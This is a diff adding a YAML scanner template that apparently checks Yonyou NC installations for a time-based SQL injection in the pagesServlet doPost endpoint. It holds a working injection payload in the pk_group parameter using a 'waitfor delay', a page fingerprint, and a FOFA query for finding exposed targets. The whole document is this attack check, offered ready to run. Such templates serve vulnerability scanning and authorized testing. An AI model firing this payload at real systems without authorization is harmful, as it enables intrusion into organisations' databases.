@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-nc-dopost-sqli
+info:
+  name: 用友 NC doPost SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /index.jsp
+  expression: status_code == 200 && contains(body,"<TITLE>Yonyou NC</TITLE>")
+- method: GET
+  path: /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(body,"<Pages>") &&
+
+    contains(body,"xml") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
